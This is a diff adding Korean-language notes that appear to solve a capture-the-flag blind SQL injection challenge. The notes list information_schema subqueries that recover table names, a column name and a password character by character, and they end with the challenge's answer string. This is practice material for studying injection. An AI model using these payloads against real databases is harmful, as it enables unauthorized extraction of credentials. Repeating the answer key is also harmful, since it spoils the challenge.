@@ -1,0 +1,33 @@
+(select count(*) from information_schema.tables where table_schema = database())
+==> 이걸로 table의 갯수가 두개라는 것을 알아냄
+
+(select length(table_name) from information_schema.tables where table_schema = database() limit 0,1)
+==> 첫번째 table은 13글자
+
+(select length(table_name) from information_schema.tables where table_schema = database() limit 1,1)
+==> 첫번째 table은 3글자
+
+python으로 코딩하여 두 table의 이름을 알아내자
+(select ascii(substring(table_name,{i},1)) from information_schema.tables where table_schema = database() limit 0,1)
+==> 첫번째 table의 이름은 admin_area_pw
+
+(select ascii(substring(table_name,{i},1)) from information_schema.tables where table_schema = database() limit 1,1)
+==> 두번째 table의 이름은 log
+
+느낌상 admin_area_pw table에 답이 있을 것 같으니 table의 속성을 파헤쳐보자
+
+(select count(*) from information_schema.columns where table_name = 'admin_area_pw')
+==> admin_area_pw table에는 column이 한개이다.
+
+(select length(column_name) from information_schema.columns where table_name = 'admin_area_pw')
+==> column name은 두 글자
+
+(select ascii(substring(column_name,{i},1)) from information_schema.columns where table_name = 'admin_area_pw')
+==> column name은 'pw'
+
+(select length(pw) from admin_area_pw)
+==> pw값의 갯수는 17글자
+
+(select ascii(substring(pw,{i},1)) from admin_area_pw)
+==> pw 값은 'kudos_to_beistlab'이다 !! 
+
